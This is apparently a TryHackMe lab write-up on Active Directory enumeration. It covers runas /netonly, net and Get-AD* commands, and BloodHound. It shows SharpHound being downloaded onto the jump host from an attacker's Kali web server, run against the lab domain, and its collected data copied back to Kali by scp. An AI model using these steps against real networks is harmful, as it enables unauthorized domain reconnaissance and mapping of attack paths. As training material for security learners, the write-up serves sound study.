# TryHackMe | Enumerating Active Directory

runas.exe
---------

In the example, we have the following command:

*   `/netonly` - use the credentials for network sessions only, all other commands run in the current user session on the local host
*   `/user` - the user we want to authenticate as in network sessions
*   `cmd.exe` spawn a new command prompt window with the injected network credential

```
runas.exe /netonly /user:domain.tld\username cmd.exe
```


An attacker could then use the network session to enumerate `SYSVOL` on the domain controller, since even low level users can read it

Kerberos vs. NTLM
-----------------

Kerberos authentication relies on fully qualified domain names (FQDN), because the FQDN of the service is referenced directly in the ticket. In Active Directory environments where Kerberos authentication is enabled, you may still be able to force services to fall back to NTLM authentication by using the IP address of a host.

NTLM is so heavily integrated into Microsoft products that in most cases it's going to be running side-by-side with Kerberos.

net command
-----------

*   `net user /domain` – Run on a domain-joined host to enumerate domain users
*   `net user user.name /domain` – Run on a domain-joined host to get information about a specific domain user
*   `net group /domain` – Run on a domain-joined host to enumerate domain groups
*   `net group groupName /domain` – Run on a domain-joined host to get the members of a domain group
*   `net accounts /domain` – Run on a domain-joined host to show the domain password and account lockout policy

### Drawbacks

*   `net` does not show nested groups
*   `net` only shows up to 10 groups even if a user is in more

SSH to the Jump Host
--------------------

```
ssh user.name@za.tryhackme.com@thmjmp1.za.tryhackme.com
```


Run the command `powershell` to open a PowerShell terminal. Since we are running PowerShell on a domain-joined host, we do not need to pass the `-Server` parameter shown in the examples.

Users
-----

*   `Get-ADUser -Filter *` – return all domain users
*   `Get-ADUser -Filter 'Name -like "*stevens"'` – find any user where name ends in `...stevens`
*   `Get-ADUser -Identity john.doe -Properties *` – find the user `john.doe` and return all properties

Groups
------

*   `Get-ADGroup -Filter *` – return all domain groups
*   `Get-ADGroup -Identity Administrators | Get-ADGroupMember` – pipe the `Administrators` group object to `Get-ADGroupMember` to retrieve members of the group

AD Objects
----------

*   Get any domain objects that we modified on or after a specific date and time

```
# February 28, 2022 00:00:00 (system time zone)
$modifiedDate = Get-Date '2022/02/28'
Get-ADObject -Filter "whenChanged -ge $modifiedDate" -IncludeDeletedObjects
```


Domains
-------

*   `Get-ADDomain` – get information about the domain from the domain controller

Change a User Password
----------------------

```
$oldPass = Read-Host -AsSecureString -Prompt 'Enter the old password'
$newPass = Read-Host -AsSecureString -Prompt 'Enter the new password'
Set-ADAccountPassword -Identity user.name -OldPassword $oldpPass -NewPassword $newPass
```

Bloodhound and Collectors
-------------------------

Bloodhound is the software that runs locally on an attacker's machine. The attacker must run a "collector" on a target where it will enumerate lots of information about the domain. After the collector finishes running, it will output a series of `.json` files for import into the attacker's Bloodhound interface.

Practical
---------

### Download Bloodhound

You can download the latest release of `sharphound.exe` from the GitHub releases page:


Releases · BloodHoundAD/SharpHound

```
wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip
```


### Transfer to the Target

On my Kali VM, I am going to host a Python3 web server to transfer the `.zip` archive to the SSH session running on the jump host.

```
sudo python3 -m http.server 80
```


### Run Bloodhound

Now, from the jump host in the PowerShell session, I'll use these commands:

```
cd ~/Documents

# Download the .zip file from Kali
Invoke-WebRequest http://kali-vpn-ip/SharpHound-v1.1.0.zip -OutFile SharpHound-v1.1
.0.zip

# Unzip the archive with PowerShell
Expand-Archive SharpHound-v1.1.0.zip
cd SharpHound-v1.1.0
```


Now, we're ready to run the collector, `sharphound.exe` .

```
.\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
```


![](https://benheater.com/content/images/2022/08/image-47.png)

### Transfer Data to Kali

Now that the collector has finished running, I've got a `20220805005305_BloodHound.zip` that I need to transfer back to Kali for analysis. I'll use SCP to transfer the file.

```
scp username@za.tryhackme.com@thmjmp1.za.tryhackme.com:C:/Users/username/Documents/SharpHound-v1.1.0/20220805005305_BloodHound.zip .
```


### Analyze with Bloodhound

If this is your first time running Bloodhound, follow the instructions in the room to get started.

```
neo4j console &
bloodhound &
```


Drag and drop the `.zip` file to Bloodhound and wait for it to load the data.

![](https://benheater.com/content/images/2022/08/image-48.png)

![](https://benheater.com/content/images/2022/08/image-49.png)

#### Attack Paths

*   You can use the `Search for a node...` area to find specific users, groups, etc.
*   You can click on specific properties of the object to graph things out (eg. group memberships)
*   You can use the `Analysis` tab to run built-in queries (or write your own)
*   Much, much more